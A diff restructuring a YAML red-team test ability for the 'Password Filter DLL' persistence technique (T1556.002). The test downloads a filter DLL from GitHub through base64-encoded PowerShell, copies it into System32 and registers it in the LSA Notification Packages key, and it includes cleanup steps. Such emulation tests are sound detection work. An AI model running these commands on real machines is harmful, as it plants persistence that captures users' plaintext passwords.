@@ -1,27 +1,18 @@
-- id: 1a77916c-cf36-54a9-96a0-fe0b243febfc
+- requirements: []
   name: Soumaia ART Tests - Install and Register Password Filter DLL
   description: "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\nThe binary in bin is https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\nSource is in src folder. \nThis does require a reboot to see the filter loaded into lsass.exe. \nIt does require Administrative privileges to import the clean registry values back into LSA, it is possible you may have to manually do this after for cleanup. (requires elevation)"
   tactic: persistence
-  technique:
-    attack_id: T1556.002
-    name: 'Modify Authentication Process: Password Filter DLL'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAGIAaQBuAFwAQQB0AG8AbQBpAGMAUgBlAGQAVABlAGEAbQBQAFcARgBpAGwAdABlAHIALgBkAGwAbAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADUANgAuADAAMAAyAC8AYgBpAG4ALwBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFAAVwBGAGkAbAB0AGUAcgAuAGQAbABsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABiAGkAbgBcAEEAdABvAG0AaQBjAFIAZQBkAFQAZQBhAG0AUABXAEYAaQBsAHQAZQByAC4AZABsAGwAIgAKAA==
-          }
-          reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ".\lsa_backup.reg"
-          $passwordFilterName = (Copy-Item ".\bin\AtomicRedTeamPWFilter.dll" -Destination "C:\Windows\System32" -PassThru).basename
-          $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
-          $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
-          $notificationPackagesValues += $passwordFilterName
-          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
-        cleanup: |-
-          reg.exe import ".\lsa_backup.reg"
-          remove-item C:\Windows\System32\AtomicRedTeamPWFilter.dll
-        payloads:
-        - bin
-        - lsa_backup.reg
+  technique_id: T1556.002
+  technique_name: 'Modify Authentication Process: Password Filter DLL'
+  executors:
+  - cleanup:
+    - reg.exe import ".\lsa_backup.reg"; remove-item C:\Windows\System32\AtomicRedTeamPWFilter.dll
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - bin
+    - lsa_backup.reg
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAGIAaQBuAFwAQQB0AG8AbQBpAGMAUgBlAGQAVABlAGEAbQBQAFcARgBpAGwAdABlAHIALgBkAGwAbAAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwByAGUAZAB0AGUAYQBtAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQA1ADUANgAuADAAMAAyAC8AYgBpAG4ALwBBAHQAbwBtAGkAYwBSAGUAZABUAGUAYQBtAFAAVwBGAGkAbAB0AGUAcgAuAGQAbABsACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABiAGkAbgBcAEEAdABvAG0AaQBjAFIAZQBkAFQAZQBhAG0AUABXAEYAaQBsAHQAZQByAC4AZABsAGwAIgAKAA== }; reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ".\lsa_backup.reg"; $passwordFilterName = (Copy-Item ".\bin\AtomicRedTeamPWFilter.dll" -Destination "C:\Windows\System32" -PassThru).basename; $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"; $notificationPackagesValues = $lsaKey.GetValue("Notification Packages"); $notificationPackagesValues += $passwordFilterName; Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
+  id: 1a77916c-cf36-54a9-96a0-fe0b243febfc
